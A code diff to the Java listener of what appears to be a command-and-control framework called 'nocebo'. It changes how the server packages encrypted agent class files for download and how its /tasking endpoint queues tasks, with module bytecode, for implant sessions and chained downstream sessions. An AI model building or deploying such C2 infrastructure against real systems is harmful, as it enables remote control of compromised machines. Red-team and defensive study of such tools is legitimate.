@@ -243,37 +243,25 @@ public class ListenerApplication {
 			HttpHeaders respHeaders = new HttpHeaders();
     		respHeaders.set("uuid", downloadNonce);
 
-			ArrayList retrData = new ArrayList();
-			File folder = new File(String.format("..%sfileroot%scom%snocebo%snCore",File.separator,File.separator,File.separator,File.separator));
-			File[] listOfFiles = folder.listFiles();
-			
-			for (int f=0;f<listOfFiles.length;f++)
-			{
-				String fName = listOfFiles[f].getName();
-				if (fName.contains("iAgent"))
-				{
-					String cName = new String(
-						Base64.getEncoder().encode(
-							fName.replace(".class","").getBytes(StandardCharsets.UTF_8)
-						)
-					);
+			ArrayList respoData = new ArrayList();
+			Hashtable<String,byte[]> retrData = napi.mkRespoData("iAgent");
 
-					byte[] fileData = Files.readAllBytes(listOfFiles[f].toPath().toAbsolutePath());
+			Enumeration<String> c = retrData.keys();
+			while (c.hasMoreElements())
+			{
+				String cFileName = c.nextElement();
 					String cData = new String(
 						Base64.getEncoder().encode(
 							sapi.encrypt(
-								fileData,
+								retrData.get(cFileName),
 								downloadNonce.substring(0,12).replace("-","").getBytes(StandardCharsets.UTF_8),
 								epc.agentKey
 							)
 						)
 					);
-					retrData.add(String.format("%s.%s",cName,cData));
-
-				}
+				respoData.add(String.format("%s.%s",cFileName,cData));
 			}
-
-    		return new ResponseEntity<String>(String.join("|",retrData), respHeaders, HttpStatus.OK);
+    		return new ResponseEntity<String>(String.join("|",respoData), respHeaders, HttpStatus.OK);
 
 		}
 
@@ -327,7 +315,7 @@ public class ListenerApplication {
 		@PostMapping("/tasking")
 		String ctrl(@RequestBody noceboApiCommand requestData, @CookieValue("nocebo.auth") String authCookie) throws IOException
 		{
-			session sessionData = null;
+			ArrayList<session> sessionData = new ArrayList();
 			boolean foundDownstream = false;
 			//put authenticator in front
 			if (!epc.sessionTable.keySet().contains(requestData.uuid))
@@ -339,7 +327,7 @@ public class ListenerApplication {
 					session tempSessionData = (session) epc.sessionTable.get(sessionKey);
 					if (tempSessionData.downstream.contains(requestData.uuid))
 					{
-						sessionData = tempSessionData;
+						sessionData.add(tempSessionData);
 					}
 				}
 				
@@ -350,7 +338,7 @@ public class ListenerApplication {
 			}
 			else
 			{
-				sessionData = (session) epc.sessionTable.get(requestData.uuid);
+				sessionData.add((session) epc.sessionTable.get(requestData.uuid));
 			}
 			
 
@@ -361,9 +349,12 @@ public class ListenerApplication {
 				requestData.args.split(",")
 			);
 
-			sessionData.tasks.add(
-				newTask
-			);
+			for (int s=0; s<sessionData.size();s++)
+			{
+				sessionData.get(s).tasks.add(
+					newTask
+				);
+			}
 
 			return String.format("Successfully added task: %s", newTask.toString());
 		}
@@ -450,11 +441,51 @@ class noceboApi
 	static class noceboApiUtil
 	{
 
-		public Hashtable mkTask(String className, String methodName, String uuid, String[] args) throws IOException
+		public Hashtable<String, byte[]> mkRespoData(String keyWord) throws InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException, Exception
 		{
-			String modPath = String.format("..%sfileroot%scom%snocebo%snCore%s%s.class",File.separator,File.separator,File.separator,File.separator,File.separator,className);
-			byte[] fileData = Files.readAllBytes(Paths.get(modPath));
-			String modData = new String(Base64.getEncoder().encode(fileData));
+			Hashtable<String, byte[]> retrData = new Hashtable();
+			File folder = new File(String.format("..%sfileroot%scom%snocebo%snCore",File.separator,File.separator,File.separator,File.separator));
+			File[] listOfFiles = folder.listFiles();
+			
+			for (int f=0;f<listOfFiles.length;f++)
+			{
+				String fName = listOfFiles[f].getName();
+				if (fName.contains(keyWord))
+				{
+					byte[] fileData = Files.readAllBytes(listOfFiles[f].toPath().toAbsolutePath());
+					String cName = new String(
+						Base64.getEncoder().encode(
+							fName.replace(".class","").getBytes(StandardCharsets.UTF_8)
+						)
+					);
+
+					
+					retrData.put(cName,fileData);
+
+				}
+			}
+			return retrData;
+		}
+
+		public Hashtable mkTask(String className, String methodName, String uuid, String[] args) throws InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException, Exception
+		{
+			Hashtable<String, byte[]> modDataSet = mkRespoData(className);
+			ArrayList modData = new ArrayList();
+
+			Enumeration<String> c = modDataSet.keys();
+			while (c.hasMoreElements())
+			{
+				String cFileName = c.nextElement();
+
+				String cFileData = new String(
+						Base64.getEncoder().encode(
+							modDataSet.get(cFileName)
+						)
+					);
+
+					
+				modData.add(String.format("%s.%s",cFileName,cFileData));
+			}
 
 			Hashtable taskData = new Hashtable();
 
@@ -462,7 +493,7 @@ class noceboApi
 			taskData.put("class",className);
 			taskData.put("method",methodName);
 			taskData.put("args",String.join(",",args));
-			taskData.put("mod",modData);
+			taskData.put("mod",String.join("|", modData));
 			
 
 			return taskData;
